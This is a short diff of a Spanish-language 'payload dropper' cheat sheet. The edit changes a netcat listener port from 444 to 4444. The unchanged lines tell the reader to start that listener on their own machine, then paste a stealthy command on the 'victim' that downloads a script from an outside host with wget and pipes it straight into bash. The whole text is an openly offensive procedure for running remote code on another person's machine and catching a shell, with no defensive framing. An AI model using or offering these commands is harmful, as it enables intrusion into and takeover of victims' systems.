@@ -4,7 +4,7 @@
   ARSENAL DE INTRUSIÓN - PAYLOAD DROPPER
 -------------------------------------------------------
 1. En TU máquina, ejecuta para escuchar:
-   nc -lvnp 444
+   nc -lvnp 4444
 
 2. En la VÍCTIMA, pega este comando sigiloso:
    wget -qO- http://192.168.1.103:8080/sorpresa.sh | bash
